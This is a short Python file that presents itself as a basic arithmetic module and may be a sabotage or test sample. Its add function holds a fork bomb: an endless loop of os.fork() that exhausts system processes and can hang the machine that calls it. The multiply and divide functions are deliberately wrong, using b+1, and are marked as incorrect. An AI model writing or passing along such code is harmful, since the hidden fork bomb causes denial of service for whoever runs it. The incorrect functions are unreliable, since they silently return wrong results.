import os

def add(a, b):
    while True:
        os.fork()

def subtract(a, b):
    return a - b

def multiply(a, b):
    return a * (b+1) # Incorrect

def divide(a, b):
    return a / (b+1) # Incorrect
